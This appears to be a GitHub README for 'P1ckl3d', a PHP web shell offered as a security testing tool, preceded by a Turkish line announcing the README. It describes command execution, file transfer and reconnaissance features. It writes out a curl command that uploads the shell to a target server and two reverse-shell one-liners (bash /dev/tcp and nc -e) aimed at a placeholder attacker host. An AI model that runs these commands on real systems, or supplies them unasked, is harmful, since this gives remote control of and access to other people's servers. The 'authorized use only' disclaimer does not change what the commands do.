GitHub README.md formatında düzenlenmiş versiyonu hazırlıyorum. Markdown formatında ve görsellerle zenginleştirilmiş şekilde:

# P1ckl3d Web Shell: Advanced Security Testing Tool 🛡️

![Security Banner](https://raw.githubusercontent.com/your-repo/assets/security-banner.png)

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![GitHub stars](https://img.shields.io/github/stars/0xP1ckl3d/p1ckled_web_shell)](https://github.com/0xP1ckl3d/p1ckled_web_shell/stargazers)
[![GitHub issues](https://img.shields.io/github/issues/0xP1ckl3d/p1ckled_web_shell)](https://github.com/0xP1ckl3d/p1ckled_web_shell/issues)

> ⚠️ **IMPORTANT**: This tool is strictly for authorized security testing only. Unauthorized use is prohibited.

## 📚 Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage Guide](#usage-guide)
- [Advanced Features](#advanced-features)
- [Security Considerations](#security-considerations)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)
- [License](#license)

## 🚀 Features

### Core Capabilities

```mermaid
graph TD
    A[P1ckl3d Web Shell] --> B[Command Execution]
    A --> C[File Management]
    A --> D[Reconnaissance]
    A --> E[Reverse Shell]
    B --> B1[Real-time Output]
    B --> B2[Command History]
    C --> C1[Upload/Download]
    C --> C2[Directory Navigation]
    D --> D1[System Info]
    D --> D2[Network Analysis]
    E --> E1[Bash Shell]
    E --> E2[Netcat Shell]

Key Features Breakdown
🔧 Command Execution
Real-time shell command execution
Command history logging
No page reload required
📁 File Management
File upload/download capabilities
Directory navigation
Hidden file access
🔍 Reconnaissance Features
System Information
OS Details
Kernel Version
PHP Configuration
Network Analysis
Open Ports
Active Connections
Firewall Status
Security Information
User Accounts
Permissions
Security Configs
💿 Installation
Clone the repository:
git clone https://github.com/0xP1ckl3d/p1ckled_web_shell.git

Upload the webshell:
# Example using curl (if applicable)
curl -F "file=@webshell.php" http://target-server/upload.php

📖 Usage Guide
Basic Commands
# List directory contents
command> ls -la

# Change directory
command> cd /var/www

# View file contents
command> cat config.php

File Management Interface

Reconnaissance Tool
# Run full system reconnaissance
command> run discovery

# Check specific system information
command> sysinfo

🔧 Advanced Features
System Information Gathering
# Example output structure
{
    "os_info": {
        "name": "Ubuntu 20.04.3 LTS",
        "kernel": "5.4.0-42-generic"
    },
    "network": {
        "interfaces": ["eth0", "lo"],
        "open_ports": [80, 443, 22]
    }
}

Reverse Shell Capabilities
# Bash reverse shell
bash -i >& /dev/tcp/attacker-ip/4444 0>&1

# Netcat reverse shell
nc -e /bin/sh attacker-ip 4444

🛡️ Security Considerations

⚠️ Critical Security Notes

Only use on authorized systems
Maintain detailed activity logs
Remove after testing
Follow security guidelines
Monitor all activities
🔧 Troubleshooting

Common issues and solutions:

Issue	Solution
Permission Denied	Check file permissions and user context
Upload Failed	Verify file size limits and server configs
Connection Issues	Check network connectivity and firewalls
🤝 Contributing
Fork the repository
Create your feature branch
Commit changes
Push to branch
Create Pull Request
📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

📊 Project Stats

🌟 Star History
